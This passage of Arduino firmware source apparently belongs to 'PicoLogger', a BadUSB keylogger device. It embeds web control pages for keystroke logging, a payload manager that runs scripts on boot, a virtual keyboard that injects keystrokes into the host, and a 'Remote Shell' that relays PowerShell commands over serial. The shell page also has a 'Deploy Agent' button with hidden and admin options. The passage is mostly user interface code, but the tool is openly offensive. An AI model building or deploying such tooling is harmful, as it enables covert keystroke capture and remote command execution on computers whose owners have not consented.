                content: "";
                height: 14px;
                width: 14px;
                left: 3px;
                bottom: 3px;
                background-color: white;
                transition: 0.4s;
                border-radius: 50%;
            }
            input:checked + .slider {
                background-color: #ffcc00;
            }
            input:checked + .slider:before {
                transform: translateX(14px);
            }
            .ascii-container {
                color: #ffcc00;
                display: auto;
                justify-content: center;
                align-items: center;
                width: 100%;
                overflow: auto;
                font-size: 14px;
                font-weight: bold;
            }
            .ascii-art {
                background: none;
                border: none;
                padding: 0;
                font-size: 14px;
                font-weight: bold;
                color: #ffcc00;
                text-align: center;
            }
            .footer {
                text-align: center;
                color: #ffcc00;
                font-size: 14px;
                background: #333;
                position: fixed;
                width: 100%;
                bottom: 0;
            }
            
            .footer a {
                color: #ffcc00;
                text-decoration: none;
                transition: 0.3s;
            }
        </style>
        <script>
            function loadPayloads() {
                fetch('/list_payloads')
                .then(response => response.json())
                .then(payloads => {
                    fetch('/list_boot_payloads')
                    .then(response => response.json())
                    .then(enabledPayloads => {
                        let table = document.getElementById('payloadTable');
                        table.innerHTML = '<tr><th>Filename</th><th>Actions</th><th>Boot</th></tr>';
                        payloads.forEach(file => {
                            let isChecked = enabledPayloads.includes(file) ? "checked" : "";
                            table.innerHTML += `
                                <tr>
                                    <td>${file}</td>
                                    <td class="action-buttons">
                                        <button onclick="runPayload('${file}')">Run</button>
                                        <button onclick="editPayload('${file}')">Edit</button>
                                        <button onclick="deletePayload('${file}')">Delete</button>
                                    </td>
                                    <td>
                                        <label class="switch">
                                            <input type="checkbox" onchange="togglePayloadOnBoot('${file}', this.checked)" id="boot-${file}" ${isChecked}>
                                            <span class="slider"></span>
                                        </label>
                                    </td>
                                </tr>
                            `;
                        });
                    });
                });
            }
            function togglePayloadOnBoot(filename, enable) {
                fetch('/toggle_payload_boot', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: `filename=${encodeURIComponent(filename)}&enable=${enable ? 1 : 0}`
                }).then(() => {
                    alert(`Payload ${filename} ${enable ? 'enabled' : 'disabled'} on boot!`);
                });
            }
            function createNewFile() {
                let filename = document.getElementById('filename').value;
                let content = document.getElementById('editor').value;
                savePayload(filename, content);
            }
            function savePayload(filename, content) {
                fetch('/save_payload', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                    body: `filename=${encodeURIComponent(filename)}&content=${encodeURIComponent(content)}`
                }).then(() => {
                    alert("Saved successfully!");
                    loadPayloads();
                });
            }
            function deletePayload(filename) {
                fetch('/delete_payload', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                    body: `filename=${encodeURIComponent(filename)}`
                }).then(() => {
                    alert("Deleted successfully!");
                    loadPayloads();
                });
            }
            function runPayload(filename) {
                fetch('/run_payload', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                    body: `filename=${encodeURIComponent(filename)}`
                }).then(() => alert("Payload executed!"));
            }
            function editPayload(filename) {
                fetch(`/get-payload?filename=${encodeURIComponent(filename)}`)
                .then(response => {
                    if (!response.ok) {
                        throw new Error("Failed to fetch payload");
                    }
                    return response.text();
                })
                .then(data => {
                    document.getElementById('filename').value = filename;
                    document.getElementById('editor').value = data;
                })
                .catch(error => {
                    console.error("Error fetching payload:", error);
                });
            }
            window.onload = loadPayloads;
        </script>
    </head>
    <body>
        <div class="top-bar">
            <a href="/">Keylogger</a>
            <a href="/payloads">Payload Manager</a>
            <a href="/keyboard">Virtual Keyboard</a>
            <a href="/shell">Remote Shell</a>
            <a href="/settings">Settings</a>
        </div>
<div class="ascii-container" align="center">
    <pre class="ascii-art">
   ___                 _                                  
  (  _ \ _            ( )                                 
  | |_) )_)  ___   _  | |      _     __    __    __  _ __ 
  |  __/| |/ ___)/ _ \| |  _ / _ \ / _  \/ _  \/ __ \  __)
  | |   | | (___( (_) ) |_( ) (_) ) (_) | (_) |  ___/ |   
  (_)   (_)\____)\___/(____/ \___/ \__  |\__  |\____)_)   
                                  ( )_) | )_) |           
                                   \___/ \___/            
    </pre>
</div>
        <div class="container">
            <h2>BadUSB Payload Manager</h2>
            <input type="text" id="filename" placeholder="Enter filename"><br>
            <textarea id="editor" rows="15" placeholder="Write your payload here..."></textarea><br>
            <button onclick="createNewFile()">Save</button>
            
            <h3>Available Payloads</h3>
            <table id="payloadTable">
                <tr><th>Filename</th><th>Actions</th></tr>
            </table>
        </div>
        <div class="footer"><p>Made by @beigeworm | github.com/beigeworm</p></div>
    </body>
    </html>
    )rawliteral";
    server.send(200, "text/html", page);
}

void handleSettingsPage() {
    String page = R"rawliteral(
    <!DOCTYPE html>
    <html>
    <head>
        <title>PicoLogger | Settings</title>
        <style>
            body {
                font-family: Arial, sans-serif;
                margin: 0;
                padding: 0;
                background-color: #1e1e1e;
                color: #ffffff;
            }
            .top-bar {
                background: #333;
                padding: 10px 20px;
                display: flex;
                justify-content: center;
                align-items: center;
                gap: 10%;
            }
            .top-bar a {
                color: white;
                text-decoration: none;
                padding: 10px 15px;
                margin: 0 5px;
                border-radius: 5px;
                background: #444;
                transition: 0.3s;
            }
            .top-bar a:hover {
                background: #666;
            }
            .container {
                width: 90%;
                max-width: 1000px;
                margin: 20px auto;
                background: #222;
                padding: 20px 20px 60px 20px;
                border-radius: 10px;
                box-shadow: 0 0 10px rgba(255, 255, 255, 0.1);
            }
            h2, h3 {
                text-align: center;
                color: #ffcc00;
            }
            input, textarea {
                box-sizing: border-box;
                width: 100%;
                padding: 10px;
                margin: 10px 0;
                border-radius: 5px;
                border: none;
                background: #333;
                color: white;
            }
            button {
                display: block;
                width: 100%;
                padding: 10px;
                margin-top: 10px;
                background: #ffcc00;
                color: black;
                border: none;
                font-size: 16px;
                font-weight: bold;
                border-radius: 5px;
                cursor: pointer;
                transition: 0.3s;
            }
            button:hover {
                background: #ffaa00;
            }
            .switch {
                position: relative;
                display: inline-block;
                width: 34px;
                height: 20px;
            }
            .switch input {
                opacity: 0;
                width: 0;
                height: 0;
            }
            .slider {
                position: absolute;
                cursor: pointer;
                top: 0;
                left: 0;
                right: 0;
                bottom: 0;
                background-color: #ccc;
                border-radius: 20px;
                transition: 0.4s;
            }
            .slider:before {
                position: absolute;
                content: "";
                height: 14px;
                width: 14px;
                left: 3px;
                bottom: 3px;
                background-color: white;
                transition: 0.4s;
                border-radius: 50%;
            }
            input:checked + .slider {
                background-color: #ffcc00;
            }
            input:checked + .slider:before {
                transform: translateX(14px);
            }
            .ascii-container {
                color: #ffcc00;
                display: auto;
                justify-content: center;
                align-items: center;
                width: 100%;
                overflow: auto;
                font-size: 14px;
                font-weight: bold;
            }
            .ascii-art {
                background: none;
                border: none;
                padding: 0;
                font-size: 14px;
                font-weight: bold;
                color: #ffcc00;
                text-align: center;
            }
            .footer {
                text-align: center;
                color: #ffcc00;
                font-size: 14px;
                background: #333;
                position: fixed;
                width: 100%;
                bottom: 0;
            }
            
            .footer a {
                color: #ffcc00;
                text-decoration: none;
                transition: 0.3s;
            }
        </style>
        <script>
            function saveSettings() {
                const ssid = document.getElementById('ssid').value;
                const password = document.getElementById('password').value;
                const wifiState = document.getElementById('wifiState').checked ? 'ON' : 'OFF';              
                fetch('/save_settings', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: `ssid=${encodeURIComponent(ssid)}&password=${encodeURIComponent(password)}&wifiState=${wifiState}`
                }).then(() => {
                    alert("Settings saved successfully!");
                }).catch(err => {
                    alert("Failed to save settings!");
                });
            }
            function formatLittleFS() {
                if (confirm('Are you sure you want to format the LittleFS? All data will be lost.')) {
                    fetch('/format_littlefs', { method: 'POST' })
                        .then(() => alert('LittleFS formatted successfully!'))
                        .catch(err => alert('Failed to format LittleFS!'));
                }
            }
            window.onload = function() {
                fetch('/load_settings')
                    .then(response => response.json())
                    .then(data => {
                        document.getElementById('ssid').value = data.ssid;
                        document.getElementById('password').value = data.password;
                        document.getElementById('wifiState').checked = data.wifiState === 'ON';
                    });
            }
        </script>
    </head>
    <body>
        <div class="top-bar">
            <a href="/">Keylogger</a>
            <a href="/payloads">Payload Manager</a>
            <a href="/keyboard">Virtual Keyboard</a>
            <a href="/shell">Remote Shell</a>
            <a href="/settings">Settings</a>
        </div>
        <div class="ascii-container" align="center">
            <pre class="ascii-art">
   ___                 _                                  
  (  _ \ _            ( )                                 
  | |_) )_)  ___   _  | |      _     __    __    __  _ __ 
  |  __/| |/ ___)/ _ \| |  _ / _ \ / _  \/ _  \/ __ \  __)
  | |   | | (___( (_) ) |_( ) (_) ) (_) | (_) |  ___/ |   
  (_)   (_)\____)\___/(____/ \___/ \__  |\__  |\____)_)   
                                  ( )_) | )_) |           
                                   \___/ \___/            
            </pre>
        </div>
        <div class="container">
            <h2>Settings</h2>
            <div class="input-group">
                <label for="ssid">WiFi SSID:</label>
                <input type="text" id="ssid" placeholder="Enter WiFi SSID">
            </div>
            <div class="input-group">
                <label for="password">WiFi Password:</label>
                <input type="text" id="password" placeholder="Enter WiFi Password">
            </div>
            <div class="input-group">
                <label for="wifiState">WiFi ON/OFF:</label>
                <label class="switch">
                    <input type="checkbox" id="wifiState">
                    <span class="slider"></span>
                </label>
                 <label for="wifiState"><code> (Use serial command '<strong>wifion</strong>' to re-enable)</code></label>
            </div>
            <button onclick="saveSettings()">Save</button>
            <button onclick="formatLittleFS()" class="warning">Format LittleFS</button>
        </div>
        <div class="footer"><p>Made by @beigeworm | github.com/beigeworm</p></div>
    </body>
    </html>
    )rawliteral";
    server.send(200, "text/html", page);
}

void handleKeyboardPage() {
    String page = R"rawliteral(
    <!DOCTYPE html>
    <html>
    <head>
        <title>PicoLogger | Virtual Keyboard</title>
        <style>
            body {
                font-family: Arial, sans-serif;
                margin: 0;
                padding: 0;
                background-color: #1e1e1e;
                color: #ffffff;
            }
            .top-bar {
                background: #333;
                padding: 10px 20px;
                display: flex;
                justify-content: center;
                align-items: center;
                gap: 10%;
            }
            .top-bar a {
                color: white;
                text-decoration: none;
                padding: 10px 15px;
                margin: 0 5px;
                border-radius: 5px;
                background: #444;
                transition: 0.3s;
            }
            .top-bar a:hover {
                background: #666;
            }
            .container {
                width: 90%;
                max-width: 1000px;
                margin: 20px auto;
                background: #222;
                padding: 20px 20px 40px 20px;
                border-radius: 10px;
                box-shadow: 0 0 10px rgba(255, 255, 255, 0.1);
                text-align: center;
            }
            h2 {
                text-align: center;
                color: #ffcc00;
            }
            .keyboard {
                display: grid;
                grid-template-columns: repeat(16, 1fr);
                gap: 5px;
                justify-content: center;
                align-items: center;
                padding: 10px;
            }
            .key {
                padding: 15px;
                background: #444;
                border-radius: 5px;
                text-align: center;
                font-size: 18px;
                font-weight: bold;
                cursor: pointer;
                transition: 0.3s;
                user-select: none;
            }
            .key:hover {
                background: #ffcc00;
                color: black;
            }
            .key-wide {
                grid-column: span 2;
            }
            .key-space {
                grid-column: span 11;
                justify-content: center;
                align-items: center;
                margin-left: 50%;
            }
            #capslock, #shift, #gui, #alt, #ctrl {
                background: #666;
            }
            .active {
                background: #ffcc00 !important;
                color: black !important;
            }
            .ascii-container {
                color: #ffcc00;
                display: auto;
                justify-content: center;
                align-items: center;
                width: 100%;
                overflow: auto;
                font-size: 14px;
                font-weight: bold;
            }
            .ascii-art {
                background: none;
                border: none;
                padding: 0;
                font-size: 14px;
                font-weight: bold;
                color: #ffcc00;
                text-align: center;
            }
            .footer {
                text-align: center;
                color: #ffcc00;
                font-size: 14px;
                background: #333;
                position: fixed;
                width: 100%;
                bottom: 0;
            }
            
            .footer a {
                color: #ffcc00;
                text-decoration: none;
                transition: 0.3s;
            }
        </style>
        <script>
            let capsLock = false;
            let shiftActive = false;
            let guiActive = false;
            let altActive = false;
            let ctrlActive = false;
            function sendKeyPress(key) {
                let keys = [];
                if (ctrlActive) keys.push("CTRL");
                if (altActive) keys.push("ALT");
                if (guiActive) keys.push("GUI");
                if (key.length === 1) {
                    if (shiftActive || capsLock) {
                        key = key.toUpperCase();
                    } else {
                        key = key.toLowerCase();
                    }
                }
                keys.push(key);
                let combo = keys.join("+");
                fetch('/keypress', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: 'key=' + encodeURIComponent(combo)
                }).then(response => response.text()).then(data => {
                    console.log('Key sent:', combo);
                }).catch(error => console.error('Error:', error));

                if (shiftActive) {
                    toggleShift(false);
                }
            }
            function toggleCapsLock() {
                capsLock = !capsLock;
                document.getElementById('capslock').classList.toggle('active', capsLock);
            }
            function toggleShift(state) {
                shiftActive = state;
                document.getElementById('shift').classList.toggle('active', shiftActive);
            }
            function toggleKey(key) {
                let element = document.getElementById(key);
                let state = !eval(key + "Active");
                eval(key + "Active = state;");
                element.classList.toggle('active', state);
            }
        </script>
    </head>
    <body>
        <div class="top-bar">
            <a href="/">Keylogger</a>
            <a href="/payloads">Payload Manager</a>
            <a href="/keyboard">Virtual Keyboard</a>
            <a href="/shell">Remote Shell</a>
            <a href="/settings">Settings</a>
        </div>
          <div class="ascii-container" align="center">
            <pre class="ascii-art">
   ___                 _                                  
  (  _ \ _            ( )                                 
  | |_) )_)  ___   _  | |      _     __    __    __  _ __ 
  |  __/| |/ ___)/ _ \| |  _ / _ \ / _  \/ _  \/ __ \  __)
  | |   | | (___( (_) ) |_( ) (_) ) (_) | (_) |  ___/ |   
  (_)   (_)\____)\___/(____/ \___/ \__  |\__  |\____)_)   
                                  ( )_) | )_) |           
                                   \___/ \___/            
            </pre>
        </div>
        <div class="container">
            <h2>Virtual Keyboard</h2>
            <div class="keyboard">
                <div class="key key-wide" onclick="sendKeyPress('ESC')">ESC</div>
                <div class="key" onclick="sendKeyPress('1')">1</div>
                <div class="key" onclick="sendKeyPress('2')">2</div>
                <div class="key" onclick="sendKeyPress('3')">3</div>
                <div class="key" onclick="sendKeyPress('4')">4</div>
                <div class="key" onclick="sendKeyPress('5')">5</div>
                <div class="key" onclick="sendKeyPress('6')">6</div>
                <div class="key" onclick="sendKeyPress('7')">7</div>
                <div class="key" onclick="sendKeyPress('8')">8</div>
                <div class="key" onclick="sendKeyPress('9')">9</div>
                <div class="key" onclick="sendKeyPress('0')">0</div>
                <div class="key" onclick="sendKeyPress('-')">-</div>
                <div class="key" onclick="sendKeyPress('=')">=</div>
                <div class="key key-wide" onclick="sendKeyPress('BACKSPACE')">BKSP</div>
                
                <div class="key key-wide" onclick="sendKeyPress('TAB')">TAB</div>
                <div class="key" onclick="sendKeyPress('q')">Q</div>
                <div class="key" onclick="sendKeyPress('w')">W</div>
                <div class="key" onclick="sendKeyPress('e')">E</div>
                <div class="key" onclick="sendKeyPress('r')">R</div>
                <div class="key" onclick="sendKeyPress('t')">T</div>
                <div class="key" onclick="sendKeyPress('y')">Y</div>
                <div class="key" onclick="sendKeyPress('u')">U</div>
                <div class="key" onclick="sendKeyPress('i')">I</div>
                <div class="key" onclick="sendKeyPress('o')">O</div>
                <div class="key" onclick="sendKeyPress('p')">P</div>
                <div class="key" onclick="sendKeyPress('[')">[</div>
                <div class="key" onclick="sendKeyPress(']')">]</div>
                <div class="key key-wide" id="capslock" onclick="toggleCapsLock()">CAPS</div>
                
                <div class="key key-wide" id="shift" onmousedown="toggleShift(true)" onmouseup="toggleShift(false)">SHIFT</div>
                <div class="key" onclick="sendKeyPress('a')">A</div>
                <div class="key" onclick="sendKeyPress('s')">S</div>
                <div class="key" onclick="sendKeyPress('d')">D</div>
                <div class="key" onclick="sendKeyPress('f')">F</div>
                <div class="key" onclick="sendKeyPress('g')">G</div>
                <div class="key" onclick="sendKeyPress('h')">H</div>
                <div class="key" onclick="sendKeyPress('j')">J</div>
                <div class="key" onclick="sendKeyPress('k')">K</div>
                <div class="key" onclick="sendKeyPress('l')">L</div>
                <div class="key" onclick="sendKeyPress(';')">;</div>
                <div class="key" onclick="sendKeyPress('\'')">&#39;</div>
                <div class="key" onclick="sendKeyPress('\\')">\</div>
                <div class="key key-wide" onclick="sendKeyPress('ENTER')">ENTER</div>
                <br></br>
                <div class="key" id="ctrl" onclick="toggleKey('ctrl')">CTRL</div>
                <div class="key" id="alt" onclick="toggleKey('alt')">ALT</div>              
                <div class="key" onclick="sendKeyPress('z')">Z</div>
                <div class="key" onclick="sendKeyPress('x')">X</div>
                <div class="key" onclick="sendKeyPress('c')">C</div>
                <div class="key" onclick="sendKeyPress('v')">V</div>
                <div class="key" onclick="sendKeyPress('b')">B</div>
                <div class="key" onclick="sendKeyPress('n')">N</div>
                <div class="key" onclick="sendKeyPress('m')">M</div>
                <div class="key" onclick="sendKeyPress(',')">,</div>
                <div class="key" onclick="sendKeyPress('.')">.</div>
                <div class="key" onclick="sendKeyPress('/')">/</div>                                
                <div class="key" id="gui" onclick="toggleKey('gui')">GUI</div>
                <br></br>
                <div class="key key-space" onclick="sendKeyPress('SPACE'); sendKeyPress(' ');">SPACE</div>
            </div>
        </div>
            <div class="footer"><p>Made by @beigeworm | github.com/beigeworm</p></div>
    </body>
    </html>
    )rawliteral";
    server.send(200, "text/html", page);
}

String executePowerShell(String command) {
    Serial.println(command);
    String response = "";
    unsigned long timeout = millis() + 2000;
    while (millis() < timeout) {
        if (Serial.available()) {
            char c = Serial.read();           
            response += c;
        }
    }   
    response.trim();
    server.send(200, "text/plain", response);
    return response.length() > 0 ? response : "No response from host.";
}

void handleExecuteCommand() {
    if (!server.hasArg("command")) {
        server.send(400, "text/plain", "Missing command");
        return;
    }
    String command = server.arg("command");
    Serial.println(command);
    String result = executePowerShell(command);
    server.send(200, "text/plain", result);
}

void handleShell() {
    String page = R"rawliteral(
    <!DOCTYPE html>
    <html>
    <head>
        <title>PicoLogger | Remote Shell</title>
        <style>
            body {
                font-family: Arial, sans-serif;
                margin: 0;
                padding: 0;
                background-color: #1e1e1e;
                color: #ffffff;
            }
            .top-bar {
                background: #333;
                padding: 10px 20px;
                display: flex;
                justify-content: center;
                align-items: center;
                gap: 10%;
            }
            .top-bar a {
                color: white;
                text-decoration: none;
                padding: 10px 15px;
                margin: 0 5px;
                border-radius: 5px;
                background: #444;
                transition: 0.3s;
            }
            .top-bar a:hover {
                background: #666;
            }
            .container {
                width: 90%;
                max-width: 1000px;
                margin: 20px auto;
                background: #222;
                padding: 20px;
                border-radius: 10px;
                box-shadow: 0 0 10px rgba(255, 255, 255, 0.1);
                text-align: center;
            }
            h2 {
                text-align: center;
                color: #ffcc00;
            }
            textarea {
                box-sizing: border-box;
                width: 100%;
                height: 250px;
                padding: 10px;
                margin: 10px 0;
                border-radius: 5px;
                border: none;
                background: #333;
                color: white;
            }
            input {
                width: 80%;
                padding: 10px;
                margin: 10px 0;
                border-radius: 5px;
                border: none;
                background: #333;
                color: white;
                font-size: 16px;
            }
            button {
                width: 15%;
                padding: 10px;
                margin-left: 5px;
                background: #ffcc00;
                color: black;
                border: none;
                font-size: 16px;
                font-weight: bold;
                border-radius: 5px;
                cursor: pointer;
                transition: 0.3s;
            }
            button:hover {
                background: #ffaa00;
            }
            .switch-container {
                display: flex;
                justify-content: center;
                gap: 20px;
                margin: 15px 0;
            }
            .switch {
                position: relative;
                display: inline-block;
                width: 60px;
                height: 34px;
            }
            .switch input {
                opacity: 0;
                width: 0;
                height: 0;
            }
            .slider {
                position: absolute;
                cursor: pointer;
                top: 0;
                left: 0;
                right: 0;
                bottom: 0;
                background-color: #444;
                transition: .4s;
                border-radius: 34px;
            }
            .slider:before {
                position: absolute;
                content: "";
                height: 26px;
                width: 26px;
                left: 4px;
                bottom: 4px;
                background-color: white;
                transition: .4s;
                border-radius: 50%;
            }
            input:checked + .slider {
                background-color: #ffcc00;
            }
            input:checked + .slider:before {
                transform: translateX(26px);
            }
            .ascii-container {
                color: #ffcc00;
                display: auto;
                justify-content: center;
                align-items: center;
                width: 100%;
                overflow: auto;
                font-size: 14px;
                font-weight: bold;
            }
            .ascii-art {
                background: none;
                border: none;
                padding: 0;
                font-size: 14px;
                font-weight: bold;
                color: #ffcc00;
                text-align: center;
            }
            .footer {
                text-align: center;
                color: #ffcc00;
                font-size: 14px;
                background: #333;
                position: fixed;
                width: 100%;
                bottom: 0;
            }
            .footer a {
                color: #ffcc00;
                text-decoration: none;
                transition: 0.3s;
            }
        </style>
        <script>
            function deployAgent() {
                let adminMode = document.getElementById("adminSwitch").checked ? "1" : "0";
                let hiddenMode = document.getElementById("hiddenSwitch").checked ? "1" : "0";

                fetch('/deploy', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: 'admin=' + adminMode + '&hidden=' + hiddenMode
                })
                .then(response => response.text())
                .then(output => {
                    alert("Agent Deployed!");
                })
                .catch(error => console.error('Error deploying agent:', error));
            }
            function executeCommand() {
                let command = document.getElementById("commandInput").value;
                if (command.trim() === "") return;
                
                fetch('/execute', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: 'command=' + encodeURIComponent(command)
                })
                .then(response => response.text())
                .then(output => {
                    document.getElementById("outputBox").value += "\n> " + command + "\n" + output + "\n";
                    document.getElementById("commandInput").value = "";
                })
                .catch(error => console.error('Error executing command:', error));
            }
            document.addEventListener("DOMContentLoaded", function() {
                document.getElementById("commandInput").addEventListener("keypress", function(event) {
                    if (event.key === "Enter") {
                        event.preventDefault();
                        executeCommand();
                    }
                });
            });
        </script>
    </head>
    <body>
        <div class="top-bar">
            <a href="/">Keylogger</a>
            <a href="/payloads">Payload Manager</a>
            <a href="/keyboard">Virtual Keyboard</a>
            <a href="/shell">Remote Shell</a>
            <a href="/settings">Settings</a>
        </div>
          <div class="ascii-container" align="center">
            <pre class="ascii-art">
   ___                 _                                  
  (  _ \ _            ( )                                 
  | |_) )_)  ___   _  | |      _     __    __    __  _ __ 
  |  __/| |/ ___)/ _ \| |  _ / _ \ / _  \/ _  \/ __ \  __)
  | |   | | (___( (_) ) |_( ) (_) ) (_) | (_) |  ___/ |   
  (_)   (_)\____)\___/(____/ \___/ \__  |\__  |\____)_)   
                                  ( )_) | )_) |           
                                   \___/ \___/            
            </pre>
        </div>
        <div class="container">
            <h2>Remote Shell</h2>
            <textarea id="outputBox" readonly></textarea>
            <input type="text" id="commandInput" placeholder="Enter command...">
            <button onclick="executeCommand()">Run</button>
            <div class="switch-container">
                <label>Admin Mode
                    <label class="switch">
                        <input type="checkbox" id="adminSwitch">
                        <span class="slider"></span>
                    </label>
                </label>
                <label>Run Hidden
                    <label class="switch">
                        <input type="checkbox" id="hiddenSwitch">
                        <span class="slider"></span>
                    </label>
                </label>
                <button onclick="deployAgent()">Deploy Agent</button>
        <div class="footer"><p>Made by @beigeworm | github.com/beigeworm</p></div>
    </body>
    </html>
    )rawliteral";
    server.send(200, "text/html", page);
}
